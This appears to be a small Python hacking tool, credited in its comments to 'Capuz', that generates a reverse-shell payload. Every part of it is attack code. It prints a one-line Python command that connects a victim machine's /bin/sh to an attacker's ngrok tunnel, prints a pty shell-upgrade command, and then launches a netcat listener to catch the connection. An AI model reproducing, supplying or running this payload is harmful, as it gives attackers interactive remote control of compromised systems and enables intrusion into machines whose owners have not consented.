#!/usr/bin/dev python 
# DESENVOLVIDO POR CAPUZ
# TWITTER: https://twitter.com/CapuzSec
import sys, os

banner = 'Ex: reverseShell.py 0.tcp.ngrok.io rport lport'

if len(sys.argv) < 4:
	print(banner)

else: 
	ngrok = sys.argv[1]
	rport = sys.argv[2]
	lport = sys.argv[3]

comandoNgrok = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ngrok,rport)
print("\n" + comandoNgrok + "\n")

shellBoa = "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
print("\n" + shellBoa + "\n")

os.system("nc -vnlp {}".format(lport))  
